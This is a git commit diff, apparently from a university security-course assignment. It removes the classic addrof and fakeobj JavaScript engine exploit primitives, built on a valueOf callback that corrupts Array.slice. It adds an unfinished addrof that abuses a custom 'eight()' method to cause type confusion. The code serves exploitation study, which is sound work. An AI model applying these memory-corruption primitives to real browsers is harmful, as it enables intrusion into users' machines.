1d587b6ffd2ab3e9243b378cb3e2939d0e30abfa
Denis Ivanov <denis.ivanov26@gmail.com>
2022-04-07 20:14:46 -0500

    Update parta.js

--- proj5/parta.js
+++ proj5/parta.js
@@ -1,32 +1,10 @@
-/*
- * TODO: Part A solution goes here!
- */
-function addrof(object) {
-        var a = [];
-        for (var i = 0; i < 100; i++)
-            a.push(i + 0.1337);   // Array must be of type ArrayWithDoubles
-
-        var hax = {valueOf: function() {
-            a.length = 0;
-            a = [object];
-            return 4;
-        }};
-
-        var b = a.slice(0, hax);
-        return Int64.fromDouble(b[3]);
-    }
-
-    function fakeobj(addr) {
-        var a = [];
-        for (var i = 0; i < 100; i++)
-            a.push({});     // Array must be of type ArrayWithContiguous
-
-        addr = addr.asDouble();
-        var hax = {valueOf: function() {
-            a.length = 0;
-            a = [addr];
-            return 4;
-        }};
-
-        return a.slice(0, hax)[3];
-    }
+let addrof = function(thing){
+    let o1 = {"gg" : 1, "ff" : thing};
+    // shift the first value plane
+    print(o1);
+    o1.eight();
+    print(o1);
+    let o = {"hi" : o1.gg, "bye" : 7};
+    // shift the second value plane
+    // suddenly, value of thing is now tagged with a float!
+    o.eight();
